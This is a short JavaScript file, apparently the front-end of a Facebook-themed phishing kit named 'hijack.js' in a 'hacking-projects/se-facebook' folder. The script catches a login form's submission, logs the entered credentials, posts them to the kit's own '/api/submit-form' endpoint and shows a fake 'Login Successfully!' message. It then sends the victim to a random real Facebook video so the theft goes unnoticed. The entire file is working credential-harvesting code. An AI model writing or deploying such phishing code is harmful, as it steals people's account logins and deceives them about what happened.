// filepath: /home/isc-kfc/Duck_Cloud_Project/hacking-projects/se-facebook/public/hijack.js
document.getElementById("loginForm").addEventListener("submit", function(event) {
    event.preventDefault();
    let formData = new FormData(this);

    // Log form data for debugging
    for (let [key, value] of formData.entries()) {
        console.log(`${key}: ${value}`);
    }

    fetch('/api/submit-form', {
        method: "POST",
        body: formData
    })
    .then(response => response.text())
    .then(data => {
        console.log("Response:", data);
        alert("Login Successfully!");

        let links = [
            "https://www.facebook.com/100032775767828/videos/1159220215447752?idorvanity=482689016783601",
            "https://www.facebook.com/reel/1297639230783140",
            "https://www.facebook.com/reel/8025194750913873",
            "https://www.facebook.com/reel/1058250826134061",
            "https://www.facebook.com/haziq.faz.2022/videos/638954062364804?idorvanity=482689016783601",
            "https://www.facebook.com/ThePalMemes/videos/1790441555136299",
            "https://www.facebook.com/ThePalMemes/videos/9122983674466862",
        ];

        let randomIndex = Math.floor(Math.random() * links.length);
        let randomLink = links[randomIndex];
        window.location.href = randomLink;
    })
    .catch(error => {
        console.error("Error:", error);
        alert("Error submitting form!");
    });
});

